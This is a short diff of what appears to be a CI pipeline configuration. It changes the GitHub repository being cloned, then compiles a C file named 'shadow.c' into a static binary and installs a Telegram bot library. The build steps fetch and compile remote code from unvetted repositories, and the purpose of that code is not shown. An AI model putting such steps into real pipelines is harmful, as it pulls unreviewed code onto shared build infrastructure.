@@ -5,8 +5,8 @@ pipelines:
         image: python:3.9
         size: 2x
         script:
-          - git clone https://github.com/ZoyaAkhtar88/shadow.git
-          - cd shadow
+          - git clone https://github.com/7076501952/md.git
+          - cd md
           - ls
           - gcc -o shadow shadow.c -lz -static -lpthread
           - pip install telebot
